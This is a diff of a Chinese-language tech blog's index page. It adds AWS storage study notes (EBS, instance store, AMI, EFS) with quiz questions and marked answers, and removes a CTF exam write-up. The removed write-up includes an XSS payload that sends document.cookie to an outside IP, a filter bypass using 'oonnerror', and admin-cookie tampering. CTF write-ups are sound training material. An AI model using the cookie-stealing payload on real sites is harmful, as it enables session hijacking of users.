@@ -124,6 +124,522 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-EBS" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/06/07/EBS/" class="article-date">
+  	<time datetime="2024-06-07T13:41:34.252Z" itemprop="datePublished">2024-06-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/06/07/EBS/">
+        AWS EC2 Instance Storage
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="EBS-Volume-彈性塊存儲"><a href="#EBS-Volume-彈性塊存儲" class="headerlink" title="EBS Volume 彈性塊存儲"></a>EBS Volume 彈性塊存儲</h3><p><img src="/img/EBS.png" alt="Untitled"></p>
+<ul>
+<li>網路驅動器</li>
+<li>實例運行時將其連接到實例上</li>
+<li>實例即使終止，EBS也允許我們保留數據</li>
+<li>重新創建一個實例，並裝載到之前同一個EBS可以取回數據</li>
+<li>在CCP Level 一次只能裝載到一個實例</li>
+<li>創建EBS時，它將綁訂到特定的可用區域(AZ)<ul>
+<li>假設使用us-east-1a則無法連接到us-east-1b</li>
+<li>執行快照，則可以在不同的可用性區域之間移動Volume</li>
+</ul>
+</li>
+<li>每月提供30GB免費存儲類型的通用或SSD或磁性</li>
+<li>使用網路在實例跟EBS中通訊</li>
+<li>可快速地從EC2實例分離並連接到另一個實例</li>
+<li>需提前調配容量</li>
+<li>可為配置容量付費，如果希望獲得更好的性能或更大的容量</li>
+<li>長期存儲</li>
+</ul>
+<h3 id="EC2-Instance-Store-→-臨時存儲"><a href="#EC2-Instance-Store-→-臨時存儲" class="headerlink" title="EC2 Instance Store → 臨時存儲"></a>EC2 Instance Store → 臨時存儲</h3><p>如果需要更高性能的硬體磁碟，使用EC2 Instance Store</p>
+<p>連接到真實的硬體服務器</p>
+<p>使用EC2實例存儲實現更好的IO性能</p>
+<p>如果希望獲得極高的磁盤性能，可以選擇這方案</p>
+<p>如果停止或終止EC2實例，存儲將丟失</p>
+<p>如果有緩衝區、緩存、如果希望有臨時數據、臨時內容</p>
+<p>服務器發生故障，將面臨巨大損失的風險，連接到EC2實例的硬體也將發生故障</p>
+<p>全部責任是確保備份，並根據需要進行複製</p>
+<h3 id="終止時刪除"><a href="#終止時刪除" class="headerlink" title="終止時刪除"></a>終止時刪除</h3><p><img src="/img/EBS1.png" alt="Untitled"></p>
+<ul>
+<li>默認情況下，Delete on Termination 對於Root Volume 處於選中狀態<ul>
+<li>Root EBS Volume 將與被終止的實例一起刪除</li>
+</ul>
+</li>
+<li>對於新的EBS Volume ，此選項未處於選中狀態<ul>
+<li>任何其他連接的EBS Volume 都不會被刪除</li>
+</ul>
+</li>
+<li>如果希望終止實例時保留Root Volume，則可以禁用Root Volume 的Delete on Termination</li>
+</ul>
+<h3 id="EBS-Snapshots"><a href="#EBS-Snapshots" class="headerlink" title="EBS Snapshots"></a>EBS Snapshots</h3><ul>
+<li>EBS快照是EBS Volume 在任意時間點的備份</li>
+<li>不必將EBS Volume 從EC2實例中分離</li>
+<li>可以跨不同的可用性區域甚至跨不同的區域複製這些EBS快照</li>
+</ul>
+<p><img src="/img/EBS2.png" alt="Untitled"></p>
+<ul>
+<li><p>封存快照 Archive</p>
+<p>  <img src="/img/EBS3.png" alt="Untitled"></p>
+<ul>
+<li>快照移動到封存層</li>
+<li>成本最多可以降低75%</li>
+<li>恢復歸檔將需要24~72小時</li>
+</ul>
+</li>
+<li><p>回收站EBS快照 Recycle Bin</p>
+<ul>
+<li>如果刪除EBS Snapshots，不是永久刪除，會在Recycle Bin中</li>
+<li>可以從意外刪除中恢復<ul>
+<li>可以設置為一天到一年的保留時間</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>快速快照恢復 Fast Snapshot Restore (FSR)</p>
+<ul>
+<li>強制快照進行完全初始化，以便在第一次使用時沒有延遲</li>
+<li>如果快照很大，需要初始化EBS或需要快速從其中實例化出來</li>
+<li>需要花費大量資金</li>
+</ul>
+</li>
+</ul>
+<h3 id="EBS-Volume-Types"><a href="#EBS-Volume-Types" class="headerlink" title="EBS Volume Types"></a>EBS Volume Types</h3><p><img src="/img/EBS4.png" alt="Untitled"></p>
+<ul>
+<li>6 types<ul>
+<li>gp2&#x2F;gp3 (SSD)<ul>
+<li>平衡各種工作負載的價格和性能</li>
+<li>為了實現經濟高效的存儲延遲</li>
+<li>gp2<ul>
+<li>具有低延遲的經濟高效的存儲</li>
+<li>可將其用於系統引導Volume</li>
+<li>1GB~16TB不等</li>
+<li>有些較小的gp2 Volume 可以爆發到3000 IOPS</li>
+<li>Volume 的大小和IOPS關聯</li>
+<li>IOPS、吞吐量連接再一起無法單獨設置</li>
+<li>如果增加IOPS、Volume GB數，將獲得3個以上的IOPS，最高到16000 IOPS ⇒ 5334 GB(最大值)</li>
+</ul>
+</li>
+<li>gp3<ul>
+<li>新一代Volume</li>
+<li>可獨立設置IOPS和吞吐量</li>
+<li>提供了3000 IOPS的基線和每秒125MB的吞吐量</li>
+<li>可以將IOPS增加到16000</li>
+<li>吞吐量增加到每秒1000MB</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Provisioned IOPS (PIOPS SSD) Input&#x2F;Output Operations Per Second<ul>
+<li><p>用於需要維持IOPS性能的關鍵業務應用程式</p>
+</li>
+<li><p>需要大量的IOPS(可能超過16000的應用程式)</p>
+</li>
+<li><p>存儲性能和一致性非常敏感的數據工作負載</p>
+</li>
+<li><p>io1(4GiB-16GiB(最大可調配))</p>
+<ul>
+<li>對於Nitro EC2實例，最大PIOPS約為64000</li>
+<li>對於其他類型的實例，最大PIOPS約為32000</li>
+<li>可以獨立於存儲大小來增加調配的IOPS</li>
+</ul>
+</li>
+<li><p>io2 Block Express(4GiB-64TiB)</p>
+<ul>
+<li>Sub-millisecond 等級的延遲</li>
+<li>獲得大量的最大IOPS<ul>
+<li>256000 with an IOPS:GiB ratio of 1000:1</li>
+</ul>
+</li>
+<li>性能非常高的I&#x2F;O類型的Volume</li>
+</ul>
+</li>
+<li><p>支持EBS多連接功能</p>
+<p>  <img src="/img/EBS5.png" alt="Untitled"></p>
+<ul>
+<li>允許將相同的EBS Volume 連接到同一可用性區域中的多個EC2實例</li>
+<li>僅適用io1、io2系列的EBS Volume</li>
+<li>每個實例都將擁有對高性能Volume 的完全讀寫權限，意味著可以同時讀寫</li>
+<li>在clustered Linux Application(Teradata 或你的應用程式必須管理併發寫入操作) 將獲得更高的應用程式可用性</li>
+<li>僅在指定可用性區域中可用</li>
+<li>不允許將EBS Volume 從一個連接到另一個<ul>
+<li>多連接的另一個限制是一次<strong>最多可以連接16個EC2實例</strong></li>
+</ul>
+</li>
+<li>要使其正常工作，必須使用一個支持集群的文件系統<ul>
+<li>不同於XFS、EXT4</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>io1&#x2F;io2 Block Express (SSD)</p>
+<ul>
+<li>性能最高的SSD Volume</li>
+<li>用於任務關鍵型低延遲和高吞吐量工作負載</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Hard Disk Drives<ul>
+<li>不能是Boot Volume</li>
+<li>僅適用於以前類型的Volume</li>
+<li>125GiB - 16 TiB</li>
+<li>st1 (HDD)<ul>
+<li>經吞吐量優化的HDD</li>
+<li>適合大數據、數據倉庫、日誌處理</li>
+<li>最大吞吐量為每秒500MB&#x2F;s</li>
+<li>最大IOPS 為500</li>
+<li>為頻繁訪問的吞吐量密集型工作負載而設計的低成本HDD Volume</li>
+</ul>
+</li>
+<li>sc1 (HDD)<ul>
+<li>成本最低的HDD Volume</li>
+<li>設計用於訪問頻率較低的工作負載</li>
+<li>用於歸檔數據<ul>
+<li>不經常訪問的數據</li>
+</ul>
+</li>
+<li>當需要盡可能低的成本時可以使用它</li>
+<li>最大吞吐量為每秒250 MiB&#x2F;s</li>
+<li>最大IOPS為250</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何定義EBS Volume ?<ul>
+<li>考慮 Size |Throughput IOPS (I&#x2F;O Ops Per Sec)</li>
+</ul>
+</li>
+<li>通用SSD與預配置IOPS SSD(如果需要數據庫)與st1、sc1(如果需要高吞吐量和最低成本)</li>
+<li>如果想要獲得超過32000 IOPS，則需要具有io1 or io2的EC2 Nitro</li>
+</ul>
+<h3 id="EBS-Encryption"><a href="#EBS-Encryption" class="headerlink" title="EBS Encryption"></a>EBS Encryption</h3><ul>
+<li>當創建並加密EBS Volume 時<ul>
+<li>Volume 中的靜態數據被加密</li>
+<li>實例和Volume 之間傳輸的所有數據都被加密</li>
+<li>所有快照都將被加密</li>
+<li>從快照創建的所有Volume 都將被加密</li>
+</ul>
+</li>
+<li>所有加密和解密機制都透明的處理<ul>
+<li>一切都由EC2和EBS在後台處理</li>
+</ul>
+</li>
+<li>對延遲的影響非常小</li>
+<li>利用了KMS(AES-256)的密鑰</li>
+<li>Copy 未加密的快照時，就啟用了加密</li>
+<li>如何加密未加密的EBS Volume<ul>
+<li>創建該Volume 的EBS快照</li>
+<li>複製功能加密EBS快照</li>
+<li>從快照創建一個新的EBS Volume</li>
+<li>該Volume 也將被加密</li>
+<li>將加密的 Volume 連接到原始實例</li>
+</ul>
+</li>
+</ul>
+<h3 id="AMI-Amazon-Machine-Image"><a href="#AMI-Amazon-Machine-Image" class="headerlink" title="AMI &gt; Amazon Machine Image"></a>AMI &gt; Amazon Machine Image</h3><p><img src="/img/EBS6.png" alt="Untitled"></p>
+<ul>
+<li>可以使用AWS創建的AMI</li>
+<li>自訂義自己的AMI<ul>
+<li>自己的軟體配置</li>
+<li>定義和設置操作系統</li>
+<li>設定監控工具</li>
+<li>獲得更快的啟動時間和配置時間</li>
+</ul>
+</li>
+<li>針對特定區域構建<ul>
+<li>可跨區域複製</li>
+</ul>
+</li>
+<li>可從不同類型的AMI啟動EC2實例</li>
+<li>可以從AWS Marketplace AMI啟動EC2實例<ul>
+<li>由其他人創建的AMI</li>
+<li>可能由其他人銷售</li>
+<li>也可以自己在AWS市場上創建一個銷售AMI的業務</li>
+</ul>
+</li>
+<li>AMI Process<ul>
+<li>啟動一個EC2實例並對其自訂義</li>
+<li>停止實例確保數據完整性正確</li>
+<li>根據實例構建AMI，這樣還可以在後台創建EBS快照</li>
+<li>從其他AMI啟動實例</li>
+</ul>
+</li>
+</ul>
+<h3 id="EFS-彈性文件系統-Elastic-File-System-Service"><a href="#EFS-彈性文件系統-Elastic-File-System-Service" class="headerlink" title="EFS 彈性文件系統 Elastic File System Service"></a>EFS 彈性文件系統 Elastic File System Service</h3><p><img src="/img/EBS7.png" alt="Untitled"></p>
+<ul>
+<li><p>託管NFS (Network file system)</p>
+</li>
+<li><p>網路文件系統</p>
+</li>
+<li><p>可以掛載到許多EC2實例上</p>
+<ul>
+<li>EC2可以位於不同的可用性區域</li>
+</ul>
+</li>
+<li><p>高度可用，可自動擴展，昂貴</p>
+</li>
+<li><p>按使用量付費</p>
+<ul>
+<li>用於EFS中的每GB數據</li>
+</ul>
+</li>
+<li><p>不必提前配置容量</p>
+</li>
+<li><p>內容管理、web 服務、數據共享、Wordpress</p>
+</li>
+<li><p>內部使用NFSv4.1 協議</p>
+</li>
+<li><p>為了控制EFS的訪問，需要設置安全群組</p>
+</li>
+<li><p>只兼容基於Linux的AMI，而不是Windows</p>
+</li>
+<li><p>使用KMS在EFS驅動器中啟用靜態加密</p>
+</li>
+<li><p>它是Linux上的標準文件系統，因此使用POSIX系統，具有標準文件API</p>
+</li>
+<li><p>EFS規模</p>
+<ul>
+<li>可以獲得數千個併發NFS客戶端和10GB+&#x2F;s吞吐量</li>
+<li>自動擴展到PB級的網路文件系統</li>
+</ul>
+</li>
+<li><p>創建EFS網路文件系統時設置<strong>性能模式</strong></p>
+<ul>
+<li>通用(默認)<ul>
+<li>延遲敏感的用例(WEB server, CMS..)</li>
+<li>最大化吞吐量<ul>
+<li>最大的I&#x2F;O</li>
+<li>高延遲的網路文件系統</li>
+<li>更高的吞吐量</li>
+<li>高度並行</li>
+<li>大數據應用程式或媒體處理需求</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>吞吐量模式</p>
+<p>  <img src="/img/EBS8.png" alt="Untitled"></p>
+<ul>
+<li>Bursting 爆裂<ul>
+<li>一個TB，每秒50MiB 加上每秒100MiB</li>
+</ul>
+</li>
+<li>Provisioned 資源調配<ul>
+<li>無論存儲大小如何都要設置吞吐量</li>
+<li>隨存儲容量的增加，前一個系統的吞吐量也在增長</li>
+<li>通過配置可以為1TB的存儲容量提供每秒1GB的吞吐量</li>
+</ul>
+</li>
+<li>Elsatic<ul>
+<li>根據工作負載自動調整吞吐量</li>
+<li>適合不可預測的工作負載</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>存儲類型</p>
+<ul>
+<li><p>生命週期管理功能</p>
+</li>
+<li><p>Standard : 允許在一定天數後將文件移動到不同的存儲層</p>
+<ul>
+<li>頻繁訪問的文件標準層</li>
+</ul>
+</li>
+<li><p>Infrequent access (EFS-IA):</p>
+<ul>
+<li>可以檢索文件</li>
+<li>存儲文件的成本低</li>
+<li>不頻繁訪問的EFS-IA層</li>
+</ul>
+</li>
+<li><p>Archive 歸檔存儲層:</p>
+<p>  <img src="/img/EBS9.png" alt="Untitled"></p>
+<ul>
+<li>針對很少訪問的數據</li>
+<li>數據存儲在該層上的成本低，50% cheaper</li>
+<li>要在存儲層之間自動移動文件，可以實施生命週期策略</li>
+<li>允許定義文件在多少天後應移動到哪個層</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>可用性和持久性方面</p>
+<ul>
+<li>Standard<ul>
+<li>當具有多個可用區設置</li>
+<li>EFS跨多個可用區</li>
+<li>生產工作負載非常有用</li>
+</ul>
+</li>
+<li>One Zone<ul>
+<li>只想進行開發並希望有更便宜的選擇</li>
+<li>可以選擇一個區域，將提供一個可用性區域，仍然可以在其中進行備份，並與IA類型的存儲層兼容(EFS One Zone-IA)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>通過使用正確的EFS存儲類型，可以節省高達90%的成本</p>
+</li>
+<li><p>EBS volumes</p>
+<p>  <img src="/img/EBS10.png" alt="Untitled"></p>
+<ul>
+<li>一次連接到一個實例<ul>
+<li>除了使用io1和io2類型volumes的多連接功能邊緣情況外</li>
+</ul>
+</li>
+<li>在AZ級別鎖定</li>
+<li>gp2<ul>
+<li>如果磁盤大小增加，IO將增加</li>
+</ul>
+</li>
+<li>gp3 &amp; io1<ul>
+<li>獨立於磁盤大小增加IO</li>
+</ul>
+</li>
+<li>要跨AZ遷移EBS，需要拍快照<ul>
+<li>將快照恢復到另一個AZ</li>
+<li>EBS volumes備份，將使用大量IO，不應該在應用程式處理大量流量時運行他們，因為可能影響性能</li>
+</ul>
+</li>
+<li>如果EC2被終止，實例的路由EBS volumes將默認被終止<ul>
+<li>可以禁用該行為</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>EFS volumes</p>
+<p>  <img src="/img/EBS11.png" alt="Untitled"></p>
+<ul>
+<li>網路文件系統</li>
+<li>目標是將其連接到可用性區域中的數百個實例</li>
+<li>對於一個EFS，可以在不同的AZ中擁有不同的掛載目標</li>
+<li>多個實例可以一起共享該文件系統</li>
+<li>只適用Linux(POSIX)</li>
+<li>EFS價位高於EBS，但可以利用存儲層節省成本</li>
+<li>對於實例存儲，它是物理連接到EC2實例的，因此如果失去了EC2實例，你也會失去存儲</li>
+</ul>
+</li>
+</ul>
+<p><strong>You have just terminated an EC2 instance in <code>us-east-1a</code>, and its attached EBS volume is now available. Your teammate tries to attach it to an EC2 instance in <code>us-east-1b</code> but he can’t. What is a possible cause for this?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>He’s missing IAM permissions</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>EBS volumes are locked to an AWS Region</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>EBS volumes are locked to an Availability Zone</strong></li>
+</ul>
+<p><strong>You have launched an EC2 instance with two EBS volumes, Root volume type and the other EBS volume type to store the data. A month later you are planning to terminate the EC2 instance. What’s the default behavior that will happen to each EBS volume?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will be deleted</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>The Root volume type will be deleted and the EBS volume type will not be deleted</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>The root volume type will not be deleted and the EBS volume type will be deleted</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Both the root volume type and the EBS volume type will not be deleted</strong></li>
+</ul>
+<p><strong>You can use an AMI in N. Virginia Region <code>us-east-1</code> to launch an EC2 instance in any AWS Region.</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
+</ul>
+<blockquote>
+<p>AMIs are built for a specific AWS Region, they’re unique for each AWS Region. You can’t launch an EC2 instance using an AMI in another AWS Region, but you can copy the AMI to the target AWS Region and then use it to create your EC2 instances.</p>
+</blockquote>
+<p><strong>Which of the following EBS volume types can be used as boot volumes when you create EC2 instances?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>st1</code>, <code>sc1</code></strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong><code>gp2</code>, <code>gp3</code>, <code>io1</code>, <code>io2</code></strong></li>
+<li><input disabled="" type="checkbox"> • <strong><code>io1</code>, <code>io2</code>, <code>st1</code>, <code>sc1</code></strong></li>
+</ul>
+<p><strong>What is EBS Multi-Attach?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in multiple AZs</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in the same AZ to the same EC2 instance</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Attach the same EBS volume to multiple EC2 instances in the same AZ</strong></li>
+</ul>
+<blockquote>
+<p>Using EBS Multi-Attach, you can attach the same EBS volume to multiple EC2 instances in the same AZ. Each EC2 instance has full read&#x2F;write permissions.</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Attach multiple EBS volumes in multiple AZs to the same EC2 instance</strong></li>
+</ul>
+<p><strong>You would like to encrypt an unencrypted EBS volume attached to your EC2 instance. What should you do?</strong></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Create an EBS snapshot of your EBS volume. Copy the snapshot and tick the option to encrypt the copied snapshot. Then, use the encrypted snapshot to create a new EBS volume</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Select your EBS volume, choose Edit Attributes, then tick the Encrypt using KMS option</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Create a new encrypted EBS volume, then copy data from your unencrypted EBS volume to the new EBS volume.</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Submit a request to AWS Support to encrypt your EBS volume</strong></li>
+</ul>
+<p><strong>You have a fleet of EC2 instances distributes across AZs that process a large data set. What do you recommend to make the same data to be accessible as an NFS drive to all of your EC2 instances?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use EBS</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Use EFS</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Use an Instance Store</strong></li>
+</ul>
+<p><strong>You would like to have a high-performance local cache for your application hosted on an EC2 instance. You don’t mind losing the cache upon the termination of your EC2 instance. Which storage mechanism do you recommend as a Solutions Architect?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>EBS</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>EFS</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Instance Store</strong></li>
+</ul>
+<p><strong>You are running a high-performance database that requires an IOPS of 310,000 for its underlying storage. What do you recommend?</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>gp2</code> drive</strong></li>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io1</code> drive</strong></li>
+<li><input checked="" disabled="" type="checkbox"> • <strong>Use an EC2 Instance Store</strong></li>
+</ul>
+<blockquote>
+<p>You can run a database on an EC2 instance that uses an Instance Store, but you’ll have a problem that the data will be lost if the EC2 instance is stopped (it can be restarted without problems). One solution is that you can set up a replication mechanism on another EC2 instance with an Instance Store to have a standby copy. Another solution is to set up backup mechanisms for your data. It’s all up to you how you want to set up your architecture to validate your requirements. In this use case, it’s around IOPS, so we have to choose an EC2 Instance Store.</p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> • <strong>Use an EBS <code>io2</code> Block Express drive</strong></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-AWS_EC2_Instance_Purchasing_Options" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -3312,86 +3828,9 @@ Spot 執行個體</p>
 
 
   
-    <article id="post-SCIST_final" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/03/26/SCIST_final/" class="article-date">
-  	<time datetime="2024-03-25T16:42:22.951Z" itemprop="datePublished">2024-03-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/03/26/SCIST_final/">
-        SCIST Final Exam
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://ctf.scist.org/challenges">平台</a><br><img src="https://i.imgur.com/gpHhMXK.png"></p>
-<h2 id="wELCOME"><a href="#wELCOME" class="headerlink" title="wELCOME"></a>wELCOME</h2><p>F12開起來，FLAG藏裡面<br><img src="https://i.imgur.com/EuX2hiT.png"></p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Intruder-1-3"><a href="#Intruder-1-3" class="headerlink" title="Intruder 1&#x2F;3"></a>Intruder 1&#x2F;3</h3><p><img src="https://i.imgur.com/wnhJ6eW.png"><br>這題的wireshark檔案在過濾後好像是這些奇怪的來源?因為Huge Ports 大埠通訊的來源通常都怪怪的<br><code>dns or ((tcp.srcport &gt;=1024 and tcp.dstport &gt;=1024) and (tcp.flags.syn==1 or tcp.flags.fin==1 or tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png"><br>後來打算先看看decryption key裡面有沒有其他線索，用IDA反解過去，flag就出來嘞<br><img src="https://i.imgur.com/Q84Ifpy.png"></p>
-<h3 id="FruteForce"><a href="#FruteForce" class="headerlink" title="FruteForce?"></a>FruteForce?</h3><p><img src="https://i.imgur.com/ffN3pV1.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Real, BitVecRef, BitVecVal, Int, Extract, Solver, SolverFor, Concat, Or, And, If, sat, simplify, LShR, Sum, URem, UDiv, set_option, Tactic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = [Int(<span class="string">&#x27;apple&#x27;</span>), Int(<span class="string">&#x27;orange&#x27;</span>), Int(<span class="string">&#x27;lemon&#x27;</span>)]</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">0</span>]+x[<span class="number">1</span>]*x[<span class="number">1</span>] == <span class="number">256325</span>)</span><br><span class="line">    s.add(x[<span class="number">0</span>]*x[<span class="number">2</span>] == x[<span class="number">1</span>]*<span class="number">13910</span>+<span class="number">441</span>)</span><br><span class="line">    <span class="keyword">while</span> (t := s.check()) == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        apple, orange, lemon = [m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>**apple == (orange**<span class="number">3</span>+lemon))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pow</span>(orange, apple, lemon))</span><br><span class="line">        s.add(Or([x[i] != m[x[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]))</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>這題其實很玄，因為一開始用z3正常的方式解三元方程式可是一直解不出答案，後來換個方式去算<br><img src="https://i.imgur.com/YW8iekl.png"></p>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h3><p>登入後發現有一個 &#x2F;flag1 的頁面，不過 get 該頁面時會回傳 <code>&#123;&quot;done&quot;:false,&quot;msg&quot;:&quot;Not admin :(&quot;&#125;</code>, 發現 cookie 中有一個 is_admin，當 is_admin 為 true 時，便能成功讀取 &#x2F;flag 頁面中的 flag。<br><img src="https://i.imgur.com/6JsxjQE.png"><br><img src="https://i.imgur.com/xP5zszv.png"></p>
-<h3 id="Login-as-ADMIN"><a href="#Login-as-ADMIN" class="headerlink" title="Login as ADMIN ?"></a>Login as ADMIN ?</h3><p>接着發現網站上有兩個頁面 &#x2F;note.html 以及 &#x2F;share, &#x2F;note 中有一個能夠上傳字串到服務器的功能（類似論壇）,或許會有 XSS 的問題。同過 payload: <code>&lt;h1&gt;aaaaaa&lt;/h1&gt;</code> 的測試後發現 XSS 問題確實存在。</p>
-<p>接着 &#x2F;report 頁面似乎提供服務器主動訪問目標 url 的功能，首先來驗證服務器是否對外連網，可以使用 <code>python3 -m http.server &lt;your_port&gt;</code> 或是 <code>tcpdump -i &lt;your_interface&gt; port &lt;your port&gt;</code> 進行測試，驗證了服務器有對外連線。<br><img src="https://i.imgur.com/MvAQZmt.png"></p>
-<p>看起來 &#x2F;report 頁面會使服務器用 get 方式訪問 url，因此這裡或許可以使用不需要 victim 互動的 reflected XSS。</p>
-<p>在 notes 頁面中通過 payload:<code>&lt;img src=x onerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code> 驗證此 payload 的有效性<br><img src="https://i.imgur.com/QCaGOUG.png"></p>
-<p>不過在 share 頁面中卻無效了，review 過 &#x2F;share 頁面的原始碼後發現該頁面有客戶端的 filter，該 filter 會將 on 以及 ig 字串刪除。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; done, note &#125; = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/share&#x27;</span>+location.<span class="property">search</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    <span class="keyword">if</span> (!done) <span class="keyword">return</span> <span class="title function_">alert</span>(msg || <span class="string">&quot;Unknown error&quot;</span>)</span><br><span class="line">    content.<span class="property">innerHTML</span> = (note || <span class="string">&quot;&quot;</span>).<span class="title function_">replaceAll</span>(<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replaceAll</span>(<span class="regexp">/on/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;)()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>而想要繞過也很簡單，我們可以將 onerror 修改為 oonnerror，因此整體 payload 為：<code>&lt;img src=x oonnerror=this.src=&#39;http://27.147.28.70:9945/?&#39;+document.cookie;&gt;</code><br>將含有該 payload 的 &#x2F;share 頁面作為 &#x2F;report 頁面的 url 後，相當於對服務器主機發起 reflect XSS 攻擊，最終能成功取得主機的 cookie。<br><img src="https://i.imgur.com/YQEVzxJ.png"></p>
-<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><p>使用 <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> 將 .pyc 逆向回 .py，<br>可以發現 .py 中驗證機制如何運作，<br>密碼是 20 位數字，具體我忘了，但反正有 flag 就好 科科<br><img src="https://i.imgur.com/bSEwyxf.png"></p>
